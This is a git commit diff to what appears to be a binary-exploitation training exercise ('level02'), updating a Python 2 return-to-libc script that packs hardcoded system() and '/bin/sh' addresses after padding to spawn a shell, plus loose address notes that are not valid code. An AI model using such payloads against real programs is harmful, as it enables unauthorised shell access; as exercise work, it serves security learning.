f07b43d5ddd1123fd1515ea8a72c3110855f715e
Azeddine El makkaoui <ael-makk@e3r1p13.1337.ma>
2022-09-04 22:00:58 +0100

    update /bin/sh address:

--- level02/script.py
+++ level02/script.py
@@ -1,6 +1,16 @@
 import struct
-padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
+padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
 system = struct.pack("I", 0xb7e6b060)
 return_after_system = "AAAA"
 bin_sh = struct.pack("I", 0xb7f8cc58)
 print padding + system + return_after_system + bin_sh
+
+
+
+struct.pack("I", 0xb7e6b060)
+
+bin sh addr = 0xbffff6f8
+
+system addr = 0xb7e6b060
+
+0xb7e6b060
